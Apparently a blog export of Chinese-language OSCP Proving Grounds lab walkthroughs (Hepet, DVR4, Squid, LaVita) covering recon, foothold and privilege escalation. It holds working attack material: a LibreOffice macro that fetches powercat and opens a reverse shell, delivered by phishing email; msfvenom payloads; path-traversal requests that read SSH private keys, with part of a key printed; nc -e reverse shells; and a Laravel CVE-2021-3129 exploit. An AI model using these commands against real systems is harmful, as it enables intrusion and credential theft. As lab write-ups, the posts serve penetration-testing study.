onRemote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls200 Port command successful150 Opening data channel for directory list.-r--r--r-- 1 ftp ftp 312 Oct 20 2020 .babelrc-r--r--r-- 1 ftp ftp 147 Oct 20 2020 .editorconfig-r--r--r-- 1 ftp ftp 23 Oct 20 2020 .eslintignore-r--r--r-- 1 ftp ftp 779 Oct 20 2020 .eslintrc.js-r--r--r-- 1 ftp ftp 167 Oct 20 2020 .gitignore-r--r--r-- 1 ftp ftp 228 Oct 20 2020 .postcssrc.js-r--r--r-- 1 ftp ftp 346 Oct 20 2020 .tern-projectdrwxr-xr-x 1 ftp ftp 0 Oct 20 2020 builddrwxr-xr-x 1 ftp ftp 0 Oct 20 2020 config-r--r--r-- 1 ftp ftp 1376 Oct 20 2020 index.html-r--r--r-- 1 ftp ftp 425010 Oct 20 2020 package-lock.json-r--r--r-- 1 ftp ftp 2454 Oct 20 2020 package.json-r--r--r-- 1 ftp ftp 1100 Oct 20 2020 README.mddrwxr-xr-x 1 ftp ftp 0 Oct 20 2020 srcdrwxr-xr-x 1 ftp ftp 0 Oct 20 2020 static-r--r--r-- 1 ftp ftp 127 Oct 20 2020 _redirects226 Transfer OKftp&gt; 1lftp -e &quot;mirror -c -e / ftp&quot; ftp://192.168.184.140:20001 查看是cms: vue-blog-demo v1.0.0, 没有其他信息，并且8000用的好像也不是这个， 搜索FileZilla ftpd 0.9.41 beta 也没有可利用的已知漏洞 445 smbclient不支持匿名登录，使用扫出来的admin爆破下密码，没有结果 12345678hydra -l admin -P /usr/share/wordlists/rockyou.txt smb://192.168.184.140Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-23 15:53:36[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)[DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries (l:1/p:14344399), ~14344399 tries per task[DATA] attacking smb://192.168.184.140:445/[ERROR] invalid reply from target smb://192.168.184.140:445/ 2224 mlssmailing list subscriber services, 有订阅和忘记密码功能，暂时没有可利用的点， 也搜不到mlss的已知漏洞 79 finger使用finger-user-enum.pl 枚举用户名 github: https://github.com/pentestmonkey/finger-user-enum 工具是在walkThrough: https://medium.com/@huwanyu94/proving-grounds-practice-hepet-walkthrough-ee7e051af47b 中看到的 1234567891011./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 192.168.184.140 |grep -v &#x27;is not known&#x27;Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )######## Scan started at Sun Feb 23 16:27:33 2025 #########admin@192.168.184.140: Login: admin Name: Mail System Administrator....[No profile information]..agnes@192.168.184.140: Login: agnes Name: Agnes....[No profile information]..charlotte@192.168.184.140: Login: charlotte Name: Charlotte....[No profile information]..jonas@192.168.184.140: Login: jonas Name: Jonas....[No profile information]..magnus@192.168.184.140: Login: magnus Name: Magnus....[No profile information]..martha@192.168.184.140: Login: martha Name: Martha....[No profile information].. Mercury&#x2F;32 mail再枚举下用户名 1hydra smtp-enum://192.168.180.140:25/expn -L &quot;/usr/share/seclists/Usernames/top-usernames-shortlist.txt&quot; 2&gt;&amp;1 Mercury&#x2F;32 有缓冲区溢出漏洞，但是不知道版本号，测试了一个无法利用成功 8000 &#x2F; 443基本是静态网页，没有可交互的地方 Jonas K.的介绍像是密码， 我没发现这个密码，看了hits才留意到。walkThrough使用了 html2markdown curl http://192.168.184.140:8000/| html2markdown &gt; html.md 得到密码后第一想法是smbclient， 测试发现登录失败，ftp也不行，再次看了hits，登录邮箱 1234567891011121314151617181920212223242526272829303132333435telnet 192.168.184.140 110Trying 192.168.184.140...Connected to 192.168.184.140.Escape character is &#x27;^]&#x27;.+OK &lt;14653593.7950@localhost&gt;, POP3 server ready.user Jonas+OK Jonas is known here.pass SicMundusCreatusEst+OK Welcome! 4 messages (4744 bytes)help+OKMercury/32 MTS Post Office Protocol v3 server v4.62,Copyright (c) 1993-2008 David Harris.This server recognizes the following commands: USER - login as a user PASS - specify a password APOP - perform secure login CAPA - RFC2449 capability discovery STLS - Start TLS negotiation, if enabled STAT - show mailbox statistics RETR - send a message LIST - show message numbers and sizes DELE - delete a message RSET - &#x27;undo&#x27; all mailbox changes TOP - show lines from a message QUIT - close the connection NOOP, RPOP, LAST are also supported.Extended commands: XTND XMIT - Send a message via POP3 XTND XLST - Eudora extended list command UIDL - return unique identifier (RFC1725)..list 查看所有邮件retr 2 查看具体内容 邮件内容是： 新来的PR要求大家把spreadsheet发给mailadmin; mainadmin告诉大家公司改用LibreOffice了，spreadsheet就是office中的excel, Foothold新建一个恶意的ods文件, 操作方式如下： https://books.libreoffice.org/en/GS70/GS7013-GettingStartedWithMacros.html 反弹shell macros: 123Sub MainShell(&quot;cmd /c powershell IEX(New-Object System.Net.WebClient).DownloadString(&#x27;http://192.168.45.234/powercat.ps1&#x27;);powercat -c 192.168.45.169 -p 4444 -e powershell&quot;)End Sub 设置为打开文件时，执行macros 反弹shell. 80端口启动http.server, 使用sendemail把附件发给mailadmin，等待片刻后收到反弹shell, 用户是Ela Arwel 12sendemail -f &#x27;jonas@localhost&#x27; -t &#x27;mailadmin@localhost&#x27; -s 192.168.184.140:25 -u &#x27;another spreadsheet&#x27; -m &#x27;spreadsheet&#x27; -a /home/kali/pentestools/windows/clientside/test.odsFeb 23 15:54:03 kali sendemail[3004302]: Email was sent successfully! 1234567891011rlwrap nc -nvlp 4444listening on [any] 4444 ...connect to [192.168.45.234] from (UNKNOWN) [192.168.184.140] 51171Windows PowerShellCopyright (C) Microsoft Corporation. All rights reserved.Try the new cross-platform PowerShell https://aka.ms/pscore6PS C:\\Program Files\\LibreOffice\\program&gt; whoamiwhoamihepet\\ela arwel Eacalation收集信息发现 service: VeyonService 由localSystem启动，并且在Ela arwrl目录下，有Full control权限，msfenvom生成反弹shell可执行文件，替换veyon-service.exe msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.234 LPORT=443 -f exe -o shell.exe 1234567891011121314151617181920212223242526272829303132PS C:\\users&gt; Get-CimInstance -ClassName Win32_Service | Select-Object Name, State, PathName, StartMode, StartName | Where-Object &#123; $_.State -like &#x27;Running&#x27; -and $_.PathName -notlike &#x27;*svchost.exe*&#x27; &#125;Name : COMSysAppState : RunningPathName : C:\\WINDOWS\\system32\\dllhost.exe /Processid:&#123;02D4B3F1-FD88-11D1-960D-00805FC79235&#125;StartMode : ManualStartName : LocalSystem...Name : VeyonServiceState : RunningPathName : C:\\Users\\Ela Arwel\\Veyon\\veyon-service.exeStartMode : AutoStartName : LocalSystemPS C:\\Users\\Ela Arwel\\Veyon&gt; certutil -urlcache -f http://192.168.45.234/tmp/shell.exe s.exe certutil -urlcache -f http://192.168.45.234/tmp/shell.exe s.execertutil -urlcache -f http://192.168.45.234/tmp/shell.exe s.exe**** Online ****CertUtil: -URLCache command completed successfully. PS C:\\Users\\Ela Arwel\\Veyon&gt; mv veyon-service.exe veyon.exe mv veyon-service.exe veyon.exemv veyon-service.exe veyon.exePS C:\\Users\\Ela Arwel\\Veyon&gt; mv s.exe veyon-service.exe mv s.exe veyon-service.exemv s.exe veyon-service.exe 没有重启服务权限，但是有重启机器权限，直接shutdown &#x2F;r, 重启后获取system shell 1234567891011121314151617181920212223242526PS C:\\Users\\Ela Arwel\\Veyon&gt; restart-service VeyonService restart-service VeyonServicerestart-service VeyonServicePS C:\\Users\\Ela Arwel\\Veyon&gt; restart-service : Service &#x27;Veyon Service (VeyonService)&#x27; cannot be stopped due to the following error: Cannot open VeyonService service on computer &#x27;.&#x27;.At line:1 char:1+ restart-service VeyonService+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : CloseError: (System.ServiceProcess.ServiceController:ServiceController) [Restart-Service ], ServiceCommandException + FullyQualifiedErrorId : CouldNotStopService,Microsoft.PowerShell.Commands.RestartServiceCommand PS C:\\Users\\Ela Arwel\\Veyon&gt; net stop VeyonService net stop VeyonServicenet stop VeyonServiceSystem error 5 has occurred.PS C:\\Users\\Ela Arwel\\Veyon&gt; Access is denied.PS C:\\Users\\Ela Arwel\\Veyon&gt; shutdown /r /t 0 shutdown /r /t 0shutdown /r /t 0 123456789rlwrap nc -nvlp 443listening on [any] 443 ...connect to [192.168.45.234] from (UNKNOWN) [192.168.184.140] 49668Microsoft Windows [Version 10.0.19042.1348](c) Microsoft Corporation. All rights reserved.C:\\WINDOWS\\system32&gt;whoamiwhoamint authority\\system 反思 收集信息还是忽略了很多内容，不只要关注软件漏洞、CMS漏洞，手动信息收集也很重要，点击测试查看所有内容知道找到突破点。","categories":[{"name":"What We Do-三天打鱼","slug":"What-We-Do-三天打鱼","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/"},{"name":"OSCP","slug":"What-We-Do-三天打鱼/OSCP","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/"},{"name":"PG Lab","slug":"What-We-Do-三天打鱼/OSCP/PG-Lab","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/PG-Lab/"}],"tags":[]},{"title":"Proving Grounds Practice - DVR4","date":"2025-02-21T18:30:07.000Z","path":"post/20250222023007.html","text":"DifficultyMedium Scan123456789101112131415161718192021222324252627282930313233343536OS: Windows 10, Windows Server 2019, Windows Server 2016OS version: &#x27;10.0&#x27;OS release: &#x27;2004&#x27;OS build: &#x27;19041&#x27;[*] ssh found on tcp/22. Bitvise WinSSHD 8.48 (FlowSsh 8.48; protocol 2.0; non-commercial use)[*] msrpc found on tcp/135.[*] netbios-ssn found on tcp/139.[*] microsoft-ds found on tcp/445. SMB 3.0[*] http-proxy found on tcp/8080. &lt;meta name=&quot;GENERATOR&quot; content=&quot;Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]&quot;&gt; About the program: Argus Surveillance DVR Program is UNREGISTERED Version: 4.0 Released 18/12/2008 Argus Surveillance Inc. http-vuln-cve2011-3368: CVE:CVE-2005-3299 phpmyadmin[*] unknown found on tcp/5040.[*] msrpc found on tcp/49664.[*] msrpc found on tcp/49665.[*] msrpc found on tcp/49666.[*] msrpc found on tcp/49667.[*] msrpc found on tcp/49668.[*] msrpc found on tcp/49669. 22 WinSSHDwindows下的sshd实现，和linux一样在用户.ssh目录下会有公私钥相关文件 8.48版本没有搜索到可利用的已知漏洞 445 SMB无法匿名登录 12smbclient -L //192.168.140.179 -Nsession setup failed: NT_STATUS_ACCESS_DENIED 8080 Argus Surveillance DVR进入后在user下发现两个用户名，administrator和viewer, 看到有修改密码选项，并且不需要输入原密码，把密码改成123， 然后通过ssh登录，提示密码不正确， gobuster目录扫描也没有收获 12345ssh viewer@192.168.140.179 viewer@192.168.140.179&#x27;s password: Permission denied, please try again.viewer@192.168.140.179&#x27;s password: searchSploit搜一下已知漏洞，全部复制过来看看说明 50261 是没有引号的service路径，后面可能提权有用，但是poc里面也没有利用方法 50130 弱密码破解，并有提示arugs Surveillance DVR的配置路径，看代码是把加密的字符串按4位字符一组的解码 45296 路径穿越，poc直接测一下, 有结果返回，可以利用，但是能读什么呢 1234567891011121314curl &quot;http://192.168.140.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&amp;RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&amp;USEREDIRECT=1&amp;WEBACCOUNTID=&amp;WEBACCOUNTPASSWORD=&quot;; for 16-bit app support[386Enh]woafont=dosapp.fonEGA80WOA.FON=EGA80WOA.FONEGA40WOA.FON=EGA40WOA.FONCGA80WOA.FON=CGA80WOA.FONCGA40WOA.FON=CGA40WOA.FON[drivers]wave=mmdrv.dlltimer=timer.drv[mci] 45312 提权： 在Argus 应用文件夹下放一个恶意gsm_codec.dll,这个dll会被以SYSTEM账号执行 FootHold4种exploit 暂时能利用的是路径穿越，结合其他信息，能读的有administrator和viewer的私钥、C:\\ProgramData\\PY_Software\\Argus Surveillance DVR\\DVRParams.ini 配置信息。 成功读到了viewer账号的私钥 123456789curl &quot;http://192.168.140.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&amp;RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2Fadministrator%2F.ssh%2Fid_rsa&quot;&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;File Not Found&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;Cannot find this file.&lt;/H1&gt;The requested file: &lt;B&gt;/WEBACCOUNT.CGI?OkBtn= Ok &amp;RESULTPAGE=../../../../../../../../../../../../../../../../Users/administrator/.ssh/id_rsa&lt;/B&gt; was not found.&lt;/BODY&gt;&lt;/HTML&gt; curl &quot;http://192.168.140.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&amp;RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2Fviewer%2F.ssh%2Fid_rsa&quot;-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAuuXhjQJhDjXBJkiIftPZng7N999zteWzSgthQ5fs9kOhbFzLQJ5JYbut0BIbPaUdOhNlQcuhAUZjaaMxnWLbDJgTETK8h162J81p9q6vR2zKpHu9Dhi1ksVyAPiJ/njNKI0tjtpeO3rjGMkKgNKwvv3y2EcCEt1d+LxsO3Wyb5ezuPT349v+MVs7VW04+mGxpgheMgbX6HwqGSo9z38QetR6Ryxs+LVX49Bjhskz19gSF4/iTCbqoRo0djcH54fyPOm3OS 登录 123456ssh viewer@192.168.140.179 -i viewer.id_rsaMicrosoft Windows [Version 10.0.19044.1645](c) Microsoft Corporation. All rights reserved.C:\\Users\\viewer&gt;whoamidvr4\\viewer 读配置文件, 没有和用户密码相关的信息 12345678910curl &quot;http://192.168.140.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&amp;RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FProgramData%2FPY_Software%2FArgus%20Surveillance%20DVR%2FDVRParams.ini&quot;[Main]ServerName=ServerLocation=ServerDescription=ReadH=0UseDialUp=0DialUpConName=DialUpDisconnectWhenDone=0DIALUPUSEDEFAULTS&quot; checked checked EscalationSeShutdownPrivilege查了下viewer账号下所有文件夹，什么都没有， 在C:下发现了一个output.txt文件，查看内容是以administrator账户执行了 C:\\freezeScript\\win10.ps1, 运行时间是靶机启动时间 查看脚本的内容，发现C:下 freezeScript文件夹都没有，如果viewer账户可以重启机器，并且有C:写权限的话就可以获得adminstrator权限执行任意代码，查看权限显示有seShutdownPrivilege，写一个把viewer加入administrators group脚本 123456789101112PS C:\\freezeScript&gt; whoami /privPRIVILEGES INFORMATION----------------------Privilege Name Description State ============================= ==================================== =======SeShutdownPrivilege Shut down the system EnabledSeChangeNotifyPrivilege Bypass traverse checking EnabledSeUndockPrivilege Remove computer from docking station EnabledSeIncreaseWorkingSetPrivilege Increase a process working set EnabledSeTimeZonePrivilege Change the time zone Enabled 123456789101112131415PS C:\\&gt; md freezeScript Directory: C:\\Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 2/21/2025 9:36 AM freezeScript PS C:\\&gt; cd .\\freezeScript\\PS C:\\freezeScript&gt; &#x27;Add-LocalGroupMember -Group &quot;Administrators&quot; -Member &quot;viewer&quot;&#x27;| Out-File -FilePath &quot;C:\\freezeScript\\win10.ps1&quot;PS C:\\freezeScript&gt; cat win10.ps1Add-LocalGroupMember -Group &quot;Administrators&quot; -Member &quot;viewer&quot; 重启时提示无权限 12PS C:\\freezeScript&gt; shutdown /r /t 0Access is denied.(5) GPT的回答 1尽管你有 SeShutdownPrivilege 权限，这个错误通常是由于缺少管理员权限导致的。在 PowerShell 或命令提示符中执行 shutdown 命令需要管理员权限，即使你有相关权限，也需要以管理员身份运行 PowerShell。 winpeas上传winpeas执行也没有得到有用信息。viewer的权限也比较低，很多内容收集不到。 DRV4配置再确认下配置文件， dir发现没有ProgramData文件夹，但是前面已经读到配置文件了，文件夹应该是存在的，dir -froce查看是被隐藏了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061PS C:\\freezeScript&gt; cd /PS C:\\&gt; dir Directory: C:\\Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 2/21/2025 9:40 AM freezeScript d----- 2/21/2025 6:08 AM Microsoft d----- 12/7/2019 1:14 AM PerfLogs d-r--- 4/15/2022 7:07 AM Program Files d-r--- 6/18/2021 5:55 AM Program Files (x86) d-r--- 12/3/2021 12:21 AM Users d----- 4/15/2022 7:07 AM Windows -a---- 2/21/2025 4:52 AM 2690 output.txt PS C:\\&gt; dir -force Directory: C:\\Mode LastWriteTime Length Name ---- ------------- ------ ---- d--hs- 2/21/2025 5:06 AM $Recycle.Bin d--h-- 4/15/2022 5:02 AM $WinREAgent d--hs- 4/15/2022 7:08 AM Config.Msi d--hsl 6/18/2021 10:28 AM Documents and Settings d----- 2/21/2025 9:40 AM freezeScript d----- 2/21/2025 6:08 AM Microsoft d----- 12/7/2019 1:14 AM PerfLogs d-r--- 4/15/2022 7:07 AM Program Files d-r--- 6/18/2021 5:55 AM Program Files (x86) d--h-- 12/3/2021 12:24 AM ProgramData d--hs- 3/11/2022 10:03 PM Recovery d--hs- 6/18/2021 3:31 AM System Volume Information d-r--- 12/3/2021 12:21 AM Users d----- 4/15/2022 7:07 AM Windows -a-hs- 8/1/2024 10:33 PM 8192 DumpStack.log.tmp -a---- 2/21/2025 4:52 AM 2690 output.txt -a-hs- 8/1/2024 10:33 PM 671088640 pagefile.sys -a-hs- 8/1/2024 10:33 PM 268435456 swapfile.sys PS C:\\&gt; cd &#x27;.\\ProgramData\\PY_Software\\Argus Surveillance DVR\\&#x27;PS C:\\ProgramData\\PY_Software\\Argus Surveillance DVR&gt; dir -force Directory: C:\\ProgramData\\PY_Software\\Argus Surveillance DVRMode LastWriteTime Length Name ---- ------------- ------ ---- d----- 12/3/2021 12:26 AM Gallery d----- 12/3/2021 12:24 AM Images d----- 12/3/2021 12:26 AM Logs -a---- 2/21/2025 9:28 AM 38 Argus Surveillance DVR.DVRSes -a---- 2/21/2025 9:45 AM 5782 DVRParams.ini cat DVRParams.ini看下内容， 这次展示了很多内容，看来是通过cur查看到时候展示行数有限，被截断了。在user部分有administrator的密码密文 回到50130.py破解之 12345678910111213141516171819202122232425python 50130.py /home/kali/Tools/pg/DVR4/50130.py:27: SyntaxWarning: invalid escape sequence &#x27;\\_&#x27; banner = &#x27;&#x27;&#x27;########################################## _____ Surveillance DVR 4.0 ## / _ \\_______ ____ __ __ ______ ## / /_\\ \\_ __ \\/ ___\\| | \\/ ___/ ## / | \\ | \\/ /_/ &gt; | /\\___ \\ ## \\____|__ /__| \\___ /|____//____ &gt; ## \\/ /_____/ \\/ ## Weak Password Encryption ############# @deathflash1411 ############[+] ECB4:1[+] 53D1:4[+] 6069:W[+] F641:a[+] E03B:t[+] D9BD:c[+] 956B:h[+] FE36:D[+] BD8F:0[+] 3CD9:g[-] D9A8:Unknown 最后一个字符没有解出来，看 代码注释，是作者没加特殊字符的编码信息 特殊字符不多，以administrator用户执行反弹shell, 输入密码一个个试下，输入$时，成功获取shell。 12runas /env /profile /user:DVR4\\Administrator &quot;C:\\temp\\nc.exe -e cmd.exe 192.168.118.14 443Enter the password for DVR4\\Administrator: 123456789nc -nvlp 443listening on [any] 443 ...connect to [192.168.45.234] from (UNKNOWN) [192.168.140.179] 51874Microsoft Windows [Version 10.0.19044.1645](c) Microsoft Corporation. All rights reserved.C:\\ProgramData\\PY_Software\\Argus Surveillance DVR&gt;whoamiwhoamidvr4\\administrator 官方walkThrough中是在user页面新建了一个user用户，密码设为全部字符!@#$%^&amp;*()在通过配置文件里的密码对比得到密码明文 之前一直以为runas只能在有桌面环境的前提下使用 gsm_codec.dll提权靶机上没有gcc环境，未测试 反思本文是我在逐步看了hits之后依然没有成功后，看了完成walkThrough后，重头重新打靶的记录，但是更令我感到挫败和沮丧的是如果重新遇到这个靶机，并且整体思路、步骤正确的情况下我仍然可能拿不下这台靶机，它让我推翻自己之前解决问题的方式 信息收集阶段 在看到了arugs surveillance存在的几个漏洞之后，我放弃了继续在web页面上继续收集信息，导致没能找到viewer用户 弱密码破解poc看了之后发现用不到，并没有认真看代码，忽略了其中的配置文件注释，也尝试读取这个文件 更为严重的是：即使在这一步我看到了配置文件路径，并且测试读了配置文件，但是没有有效信息，在后续拿到viewer shell之后，我还是不会想到再去检查一次这个配置文件，因为在我的脑子里是排除法，一直在排查自己认为无法有效利用的东西，下意识里给自己减轻因为知识面不足、经验不足带来的心虚的负担 提权阶段 在发现seShutdownPrivilege无法提权，并且winpeas没有找到有用信息后，完全没了思路，哪怕再去搜一下DRV4的相关信息呢，过于依赖工具了。 更为严重的是：即使在这一步我成功找到了配置文件，我相信自己仍然不会第一时间想到searchSploit已经发现的exploit, 因为在我的脑海是排查法，一直在排除自己认为无法有效利用的东西，下意识里给自己减轻因为知识面不足、经验不足带来的心虚的负担 信息收集很重要，不要忽略任何信息，不要做减法排查，从最有可能的点着手，而不是像自己以前优先排除后聚焦的解决问题方式","categories":[{"name":"What We Do-三天打鱼","slug":"What-We-Do-三天打鱼","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/"},{"name":"OSCP","slug":"What-We-Do-三天打鱼/OSCP","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/"},{"name":"PG Lab","slug":"What-We-Do-三天打鱼/OSCP/PG-Lab","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/PG-Lab/"}],"tags":[]},{"title":"Proving Grounds Practice - Squid","date":"2025-02-19T16:30:30.000Z","path":"post/20250220003030.html","text":"scan 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354- osOS: Windows 7 Ultimate N 7600OS version: &#x27;6.1&#x27;OS release: &#x27;&#x27;OS build: &#x27;7600&#x27;Native OS: Windows 7 Ultimate N 7600Native LAN manager: Windows 7 Ultimate N 6.1- ports- 80 HTTPServer[GoAhead-Webs] HP Power Manager Cyclade + /cgi-bin/dose.pl?daily&amp;somefile.txt&amp;|ls|: DailyDose 1.1 is vulnerable to a directory traversal attack in the &#x27;list&#x27; parameter. See: OSVDB-2799 + /cgi-bin-sdb/dose.pl?daily&amp;somefile.txt&amp;|ls|: DailyDose 1.1 is vulnerable to a directory traversal attack in the &#x27;list&#x27; parameter. See: OSVDB-2799 + /forum/memberlist.php?s=23c37cf1af5d2ad05f49361b0407ad9e&amp;what=\\&quot;&gt;\\&quot;&lt;script&gt;javascript:alert(document.cookie)&lt;/script&gt;: Vbulletin 2.2.9 and below are vulnerable to Cross Site Scripting (XSS). See: OSVDB-3280 + /docs/&lt;script&gt;alert(&#x27;Vulnerable&#x27;);&lt;/script&gt;: Nokia Electronic Documentation is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0801- 139 [V] Trying to get NetBIOS names information, running command: nmblookup -s /tmp/tmpnxrjto4_ -A 192.168.197.45 [92m[+] Got domain/workgroup name: WORKGROUP[0m [92m[+] Full NetBIOS names information: - KEVIN &lt;00&gt; - B &lt;ACTIVE&gt; Workstation Service - WORKGROUP &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; Domain/Workgroup Name - WORKGROUP &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; Browser Service Elections - KEVIN &lt;20&gt; - B &lt;ACTIVE&gt; File Server Service - WORKGROUP &lt;1d&gt; - B &lt;ACTIVE&gt; Master Browser - ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; Master Browser - MAC Address = 00-50-56-AB-F9-35[0m- 445[V] Trying to get NetBIOS names information, running command: nmblookup -s /tmp/tmpnxrjto4_ -A 192.168.197.45 SMB 1.0: true SMB 2.02: true SMB 2.1: true smb-vuln-ms17-010: | VULNERABLE:| Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)| State: VULNERABLE| IDs: CVE:CVE-2017-0143| Risk factor: HIGH| A critical remote code execution vulnerability exists in Microsoft SMBv1| servers (ms17-010).| - 3389 ms-wbt-server- 3573 tag-ups-1- udp 137 netbios-ns foothold题目兔子洞较多 smb 扫描可能有永恒之蓝漏洞，多次尝试未果 web 12341. hp power manager no rce2. cyclade no rce3. dailyDose rce 但是利用不成功 http://192.168.197.45/cgi-bin/dose.pl?daily&amp;somefile.txt&amp;|whoami|4. goahead web server no rce dailyDose 利用失败 cyclade 不是系统级的漏洞 goahead 版本位置，尝试两个rce exploit未果 hp power manager 无rce 1234567891011ss hp power manager---------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path---------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Flying Dog Software Powerslave 4.3 Portalmanager - &#x27;sql_id&#x27; Information Disclosure | php/webapps/23163.txtHewlett-Packard (HP) Power Manager Administration - Remote Buffer Overflow (Metasploit) | windows/remote/16785.rbHewlett-Packard (HP) Power Manager Administration Power Manager Administration - Universal Buffer Overflow | windows/remote/10099.pyHP Power Manager - &#x27;formExportDataLogs&#x27; Remote Buffer Overflow (Metasploit) | cgi/remote/18015.rb---------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No ResultsPapers: No Results 看题解是利用缓冲区溢出漏洞 坏字符 123msfvenom -p windows/shell_reverse_tcp -b &quot;\\x00\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5c\\x3d\\x3b\\x2d\\x2c\\x2e\\x24\\x25\\x1a&quot; LHOST=192.168.45.189 LPORT=4444 -e x86/alpha_mixed -f cmsfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.189 LPORT=4444 EXITFUNC=thread -b &quot;\\x00\\x1a\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5&quot; -e x86/alpha_mixed -f python 替换n00bnoob以下部分 最后也没成功 反思 web 弱口令admin:admin进入能看到hp power manager 的版本号，没有第一时间搜索vulns, 心理过于依赖searchsploit了， 并且认为只有rce可以利用，需要积累经验 在看似可利用的点较多时，多次尝试失败导致逐渐不信任前面是不是操作有问题 看到用户名密码后应该搜索默认密码，而不是admin:admin手动撞大运","categories":[{"name":"What We Do-三天打鱼","slug":"What-We-Do-三天打鱼","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/"},{"name":"OSCP","slug":"What-We-Do-三天打鱼/OSCP","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/"},{"name":"PG Lab","slug":"What-We-Do-三天打鱼/OSCP/PG-Lab","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/PG-Lab/"}],"tags":[]},{"title":"Proving Grounds Practice - LaVita","date":"2025-02-16T16:35:15.000Z","path":"post/20250217003515.html","text":"Diffcultymedium scan123456[*] ssh found on tcp/22. OpenSSH 8.4p1 [*] http found on tcp/80. Apache/2.4.56 (Debian) 80 点击demo进入demo登录页面 注册一个账号admin:adminadmin， 登录进入后可以上传文件，上传图片后，展示在下方ImageList列表中，点击链接可以查看，尝试把php webshell改成png后台，无法上传成功，同时发现下面的imglist变空了，刚开始以为是上传了恶意文件之后，会自动把所有文件删除，实际上是有定时任务每隔一分钟清除images文件夹下的所有图片。 刷新之前上传的图片页面， 404， 可以看到CMS： Laravel 8.4.0 footholdsearchsploit 搜索 laravel, 发现8.4.2 debug mode下有rce漏洞，先开启debug mode, 开启之后未ENABLED状态，但是代码利用不成功 根据github链接, cve编号是 CVE-2021-3129, 找到 https://github.com/0x0d3ad/CVE-2021-3129 克隆执行利用代码，成功拿到反弹shell 123456└─$ python CVE-2021-3129.py http://192.168.212.38 --cmd &quot;nc 192.168.45.234 4444 -e /bin/bash&quot;[+] Generating PHAR payload for command: nc 192.168.45.234 4444 -e /bin/bash[+] Trying to clear logs[+] Logs cleared[+] Convert log file to PHAR[+] Successfully converted logs to PHAR 12345rlwrap nc -nvlp 4444listening on [any] 4444 ...connect to [192.168.45.234] from (UNKNOWN) [192.168.212.38] 56074iduid=33(www-data) gid=33(www-data) groups=33(www-data) 上传linpeas执行，发现用户除了roo外还有skunk 123╔══════════╣ Users with consoleroot:x:0:0:root:/root:/bin/bashskunk:x:1001:1001::/home/skunk:/bin/bash 发现mysql 凭证 连接mysql, 但是表里都是空的， 只有users中有一个刚刚注册的admin账号 12345678910111213mysql -ulavita -Dlavita -psdfquelw0kly9jgbx92MariaDB [lavita]&gt; show tablesshow tables;+------------------+| Tables_in_lavita |+------------------+| failed_jobs || migrations || password_resets || sessions || users |+------------------+5 rows in set (0.000 